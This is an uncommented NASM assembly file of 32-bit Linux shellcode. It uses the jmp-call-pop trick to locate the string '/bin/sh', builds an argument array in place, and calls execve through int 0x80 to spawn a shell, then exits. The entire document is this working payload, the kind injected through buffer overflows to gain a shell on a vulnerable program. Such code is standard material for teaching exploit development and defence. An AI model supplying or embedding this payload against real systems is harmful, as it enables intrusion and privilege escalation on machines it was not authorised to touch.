BITS 32

section .text
	global _start
_start:

	jmp short two

one:
	pop ebx
	xor eax, eax
	mov [ebx+7], al
	mov [ebx+8], ebx
	mov [ebx+12], eax
	lea ecx, [ebx+8]
	lea edx, [ebx+12]
	mov al, 11
	int 0x80

exit:
	mov al, 1
	xor ebx, ebx
	int 0x80

two:
	call one
	db "/bin/shXAAAABBBB"
